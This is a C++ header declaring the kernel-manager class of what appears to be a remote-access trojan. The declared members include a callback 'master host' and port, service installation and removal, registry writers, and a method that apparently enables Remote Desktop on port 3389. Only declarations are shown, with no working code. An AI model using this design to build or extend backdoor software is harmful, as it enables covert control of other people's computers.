// KernelManager.h: interface for the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_KERNELMANAGER_H__D38BBAEA_31C6_4C8A_8BF7_BF3E80182EAE__INCLUDED_)
#define AFX_KERNELMANAGER_H__D38BBAEA_31C6_4C8A_8BF7_BF3E80182EAE__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "Manager.h"
#include "Evidence.h"

class CKernelManager : public CManager  
{
public:
	static CKernelManager* CreateKernelManager(CClientSocket *pClient = NULL, LPCTSTR lpszServiceName = NULL, DWORD dwServiceType = 0, LPCTSTR lpszKillEvent = NULL, 
		LPCTSTR lpszMasterHost = NULL, UINT nMasterPort = 0); 
	static void DestoryInstance();
	
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	char	m_strServiceName[256];
	char	m_strKillEvent[256];

	static	char	m_strMasterHost[256];
	static	UINT	m_nMasterPort;

//	BOOL	m_bIsActived;

	void	UnInstallService();
	BOOL	IsActived();
	static CEvidence* GetEvidenceObj() {return m_pObjEvidence;}
	static BOOL ResetEvidenceObj() {SAFE_DELETE(m_pObjEvidence); m_pObjEvidence = new CEvidence; return TRUE;}

private:
	void	CreateStringReg(HKEY hRoot,char *szSubKey,char* ValueName,char *Data);
	void	MyCreateDWORDReg(HKEY hRoot,char *szSubKey,char* ValueName,DWORD Data);
	void	Open3389();

private:
	CKernelManager(CClientSocket *pClient, LPCTSTR lpszServiceName, DWORD dwServiceType, LPCTSTR lpszKillEvent, 
		LPCTSTR lpszMasterHost, UINT nMasterPort);
	virtual ~CKernelManager();

	HANDLE	m_hThread[10000]; // ◊„πª”√¡À
	UINT	m_nThreadCount;
	DWORD	m_dwServiceType;
	BOOL	m_bIsActived;
	static CEvidence *m_pObjEvidence;

	static CKernelManager *m_pThis;	
};

#endif // !defined(AFX_KERNELMANAGER_H__D38BBAEA_31C6_4C8A_8BF7_BF3E80182EAE__INCLUDED_)
